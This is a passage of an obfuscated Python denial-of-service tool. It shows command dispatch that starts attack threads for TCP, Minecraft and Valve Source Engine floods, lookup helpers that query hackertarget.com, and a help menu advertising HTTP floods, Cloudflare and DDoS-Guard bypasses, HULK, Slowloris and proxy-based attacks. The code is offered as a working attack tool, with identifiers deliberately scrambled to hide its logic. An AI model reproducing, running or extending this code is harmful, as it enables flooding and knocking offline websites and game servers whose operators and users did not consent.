	elif IIIlIlllIIlIIIlIl =='tcp'or IIIlIlllIIlIIIlIl =='TCP':IIIIllIlIIIlIIllI ,IIIlIllIlllIllIII ,IIIllIIlIllIIIIIl ,IIlIIllIIIllIIIlI =IlIIllllIlIllIlIl ();threading .Thread (target =IIllIlIlIIlIIIIII ,args =(IIIIllIlIIIlIIllI ,IIIlIllIlllIllIII ,IIlIIllIIIllIIIlI ,IIIllIIlIllIIIIIl )).start ();IIIIllIllIllIlIIl =threading .Thread (target =IIIllIlIlIllIlIlI ,args =(IIlIIllIIIllIIIlI ,));IIIIllIllIllIlIIl .start ();IIIIllIllIllIlIIl .join ()
	elif IIIlIlllIIlIIIlIl =='mine'or IIIlIlllIIlIIIlIl =='MINE':IIIIllIlIIIlIIllI ,IIIlIllIlllIllIII ,IIIllIIlIllIIIIIl ,IIlIIllIIIllIIIlI =IlIIllllIlIllIlIl ();threading .Thread (target =IlIlllllIllIIllII ,args =(IIIIllIlIIIlIIllI ,IIIlIllIlllIllIII ,IIlIIllIIIllIIIlI ,IIIllIIlIllIIIIIl )).start ();IIIIllIllIllIlIIl =threading .Thread (target =IIIllIlIlIllIlIlI ,args =(IIlIIllIIIllIIIlI ,));IIIIllIllIllIlIIl .start ();IIIIllIllIllIlIIl .join ()
	elif IIIlIlllIIlIIIlIl =='vse'or IIIlIlllIIlIIIlIl =='VSE':IIIIllIlIIIlIIllI ,IIIlIllIlllIllIII ,IIIllIIlIllIIIIIl ,IIlIIllIIIllIIIlI =IlIIllllIlIllIlIl ();threading .Thread (target =IIIlIIlllIIllllIl ,args =(IIIIllIlIIIlIIllI ,IIIlIllIlllIllIII ,IIlIIllIIIllIIIlI ,IIIllIIlIllIIIIIl )).start ();IIIIllIllIllIlIIl =threading .Thread (target =IIIllIlIlIllIlIlI ,args =(IIlIIllIIIllIIIlI ,));IIIIllIllIllIlIIl .start ();IIIIllIllIllIlIIl .join ()
	elif IIIlIlllIIlIIIlIl =='subnet':
		stdout .write (Fore .MAGENTA +IllIIlIIIlIlIIIIl +Fore .WHITE +IlIlIIIlllIIllIII +Fore .LIGHTGREEN_EX +_IIllIllIIIllllllI +Fore .LIGHTGREEN_EX );IIIIllIlIIIlIIllI =input ()
		try :IlIllllllIIIIIllI =requests .get (f"https://api.hackertarget.com/subnetcalc/?q={IIIIllIlIIIlIIllI}");print (IlIllllllIIIIIllI .text )
		except :print (IIllllllIIIlIIIIl )
	elif IIIlIlllIIlIIIlIl =='dns':
		stdout .write (Fore .MAGENTA +IllIIlIIIlIlIIIIl +Fore .WHITE +'IP/DOMAIN '+Fore .LIGHTGREEN_EX +_IIllIllIIIllllllI +Fore .LIGHTGREEN_EX );IIIIllIlIIIlIIllI =input ()
		try :IlIllllllIIIIIllI =requests .get (f"https://api.hackertarget.com/reversedns/?q={IIIIllIlIIIlIIllI}");print (IlIllllllIIIIIllI .text )
		except :print (IIllllllIIIlIIIIl )
	elif IIIlIlllIIlIIIlIl =='geoip':
		stdout .write (Fore .MAGENTA +IllIIlIIIlIlIIIIl +Fore .WHITE +IlIlIIIlllIIllIII +Fore .LIGHTGREEN_EX +_IIllIllIIIllllllI +Fore .LIGHTGREEN_EX );IIIIllIlIIIlIIllI =input ()
		try :IlIllllllIIIIIllI =requests .get (f"https://api.hackertarget.com/geoip/?q={IIIIllIlIIIlIIllI}");print (IlIllllllIIIIIllI .text )
		except :print (IIllllllIIIlIIIIl )
	else :stdout .write (Fore .MAGENTA +IllIIlIIIlIlIIIIl +Fore .WHITE +"Unknown command. type 'help' to see all commands.\n")
def IlIlllllIIlllIIlI ():IlIIIIlIlllllIlll =']\n';IlIIIlIIllIIlIlll =' • ';stdout .write (Fore .RED +' [\x1b[38;2;0;255;189mLAYER 7'+Fore .RED +IlIIIIlIlllllIlll );stdout .write (Fore .MAGENTA +IlIIIlIIllIIlIlll +Fore .WHITE +'spoof        '+Fore .RED +_IIllIllIIIllllllI +Fore .WHITE +'spoof X-forward attack with socks5\n');stdout .write (Fore .MAGENTA +IlIIIlIIllIIlIlll +Fore .WHITE +'cfb        '+Fore .RED +_IIllIllIIIllllllI +Fore .WHITE +'Bypass CF attack\n');stdout .write (Fore .MAGENTA +IlIIIlIIllIIlIlll +Fore .WHITE +'pxcfb      '+Fore .RED +_IIllIllIIIllllllI +Fore .WHITE +'Bypass CF attack with proxy\n');stdout .write (Fore .MAGENTA +IlIIIlIIllIIlIlll +Fore .WHITE +'cfpro      '+Fore .RED +_IIllIllIIIllllllI +Fore .WHITE +'Bypass CF UAM, CF CAPTCHA, CF BFM, CF JS (request)\n');stdout .write (Fore .MAGENTA +IlIIIlIIllIIlIlll +Fore .WHITE +'cfsoc      '+Fore .RED +_IIllIllIIIllllllI +Fore .WHITE +'Bypass CF UAM, CF CAPTCHA, CF BFM, CF JS (socket)\n');stdout .write (Fore .MAGENTA +IlIIIlIIllIIlIlll +Fore .WHITE +'sky        '+Fore .RED +_IIllIllIIIllllllI +Fore .WHITE +'HTTPS Flood and bypass for CF NoSec, DDoS Guard Free and vShield with sock5\n');stdout .write (Fore .MAGENTA +IlIIIlIIllIIlIlll +Fore .WHITE +'stellar    '+Fore .RED +_IIllIllIIIllllllI +Fore .WHITE +'HTTPS Sky method without proxies\n');stdout .write (Fore .MAGENTA +IlIIIlIIllIIlIlll +Fore .WHITE +'bypass     '+Fore .RED +_IIllIllIIIllllllI +Fore .WHITE +'HTTPS method without proxies  bypass Google Shield, VShield\n');stdout .write (Fore .MAGENTA +IlIIIlIIllIIlIlll +Fore .WHITE +'raw        '+Fore .RED +_IIllIllIIIllllllI +Fore .WHITE +'Request attack\n');stdout .write (Fore .MAGENTA +IlIIIlIIllIIlIlll +Fore .WHITE +'post       '+Fore .RED +_IIllIllIIIllllllI +Fore .WHITE +'Post Request attack\n');stdout .write (Fore .MAGENTA +IlIIIlIIllIIlIlll +Fore .WHITE +'head       '+Fore .RED +_IIllIllIIIllllllI +Fore .WHITE +'Head Request attack\n');stdout .write (Fore .MAGENTA +IlIIIlIIllIIlIlll +Fore .WHITE +'soc        '+Fore .RED +_IIllIllIIIllllllI +Fore .WHITE +'Socket attack\n');stdout .write (Fore .MAGENTA +IlIIIlIIllIIlIlll +Fore .WHITE +'hulk       '+Fore .RED +_IIllIllIIIllllllI +Fore .WHITE +'HULK - HTTP Unbearable Load King\n');stdout .write (Fore .MAGENTA +IlIIIlIIllIIlIlll +Fore .WHITE +'pxhulk     '+Fore .RED +_IIllIllIIIllllllI +Fore .WHITE +'proxyHULK HTTP Unbearable Load King\n');stdout .write (Fore .MAGENTA +IlIIIlIIllIIlIlll +Fore .WHITE +'pxraw      '+Fore .RED +_IIllIllIIIllllllI +Fore .WHITE +'Proxy Request attack\n');stdout .write (Fore .MAGENTA +IlIIIlIIllIIlIlll +Fore .WHITE +'pxsoc      '+Fore .RED +_IIllIllIIIllllllI +Fore .WHITE +'Proxy Socket attack\n');stdout .write (Fore .MAGENTA +IlIIIlIIllIIlIlll +Fore .WHITE +'pxslow     '+Fore .RED +_IIllIllIIIllllllI +Fore .WHITE +'Proxy Slowloris attack\n');stdout .write (Fore .MAGENTA +IlIIIlIIllIIlIlll +Fore .WHITE +'http2     '+Fore .RED +_IIllIllIIIllllllI +Fore .WHITE +'HTTP/2.0 Flood\n');stdout .write (Fore .MAGENTA +IlIIIlIIllIIlIlll +Fore .WHITE +'slowread        '+Fore .RED +_IIllIllIIIllllllI +Fore .WHITE +'Slowread dos.Slowhttptest\n');stdout .write (Fore .RED +' \n['+Fore .WHITE +'LAYER 4'+Fore .RED +IlIIIIlIlllllIlll );stdout .write (Fore .MAGENTA +IlIIIlIIllIIlIlll +Fore .WHITE +'tcp        '+Fore .RED +_IIllIllIIIllllllI +Fore .WHITE +'Strong TCP attack (not supported)\n');stdout .write (Fore .MAGENTA +IlIIIlIIllIIlIlll +Fore .WHITE +'udp        '+Fore .RED +_IIllIllIIIllllllI +Fore .WHITE +'Strong UDP attack (not supported)\n');stdout .write (Fore .MAGENTA +IlIIIlIIllIIlIlll +Fore .WHITE +'mine        '+Fore .RED +_IIllIllIIIllllllI +Fore .WHITE +'minecraft disconnect login DOS (not supported)\n');stdout .write (Fore .MAGENTA +IlIIIlIIllIIlIlll +Fore .WHITE +'vse        '+Fore .RED +_IIllIllIIIllllllI +Fore .WHITE +'Send Valve Source Engine Protocol\n');stdout .write (Fore .RED +' \n[\x1b[38;2;0;255;189mTOOLS'+Fore .RED +IlIIIIlIlllllIlll );stdout .write (Fore .MAGENTA +IlIIIlIIllIIlIlll +Fore .WHITE +'dns        '+Fore .RED +_IIllIllIIIllllllI +Fore .WHITE +'Classic DNS Lookup\n');stdout .write (Fore .MAGENTA +IlIIIlIIllIIlIlll +Fore .WHITE +'geoip      '+Fore .RED +_IIllIllIIIllllllI +Fore .WHITE +'Geo IP Address Lookup\n');stdout .write (Fore .MAGENTA +IlIIIlIIllIIlIlll +Fore .WHITE +'subnet     '+Fore .RED +_IIllIllIIIllllllI +Fore .WHITE +'Subnet IP Address Lookup\n');stdout .write (Fore .RED +' \n[\x1b[38;2;0;255;189mOTHER'+Fore .RED +IlIIIIlIlllllIlll );stdout .write (Fore .MAGENTA +IlIIIlIIllIIlIlll +Fore .WHITE +'clear/cls  '+Fore .RED +_IIllIllIIIllllllI +Fore .WHITE +'Clear console\n');stdout .write (Fore .MAGENTA +IlIIIlIIllIIlIlll +Fore .WHITE +'exit       '+Fore .RED +_IIllIllIIIllllllI +Fore .WHITE +'Bye..\n');stdout .write (Fore .MAGENTA +IlIIIlIIllIIlIlll +Fore .WHITE +'credit     '+Fore .RED +_IIllIllIIIllllllI +Fore .WHITE +'Thanks for\n')
if __name__ =='__main__':
	IlIIlllIIlIIIllII ();IIlIlIlIlIlllIIIl ()
	while _IlIIlIllIIIllIIlI :IIllIIIIlIllIIlIl ()